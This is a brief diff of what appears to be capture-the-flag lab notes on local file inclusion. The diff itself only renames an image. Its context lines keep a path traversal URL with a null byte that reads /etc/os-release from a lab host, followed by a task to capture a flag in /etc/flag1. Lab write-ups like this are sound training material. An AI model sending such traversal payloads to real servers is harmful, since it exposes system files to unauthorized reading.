@@ -38,7 +38,7 @@ Only worked in browser
 
 hxxp://10.10.230.14/lab6.php?file=THM-profile//..//..//..//..//etc//os-release%00
 
-<figure><img src="../../.gitbook/assets/image (14) (5) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (14) (5) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 **Capture Flag1 at /etc/flag1**
 
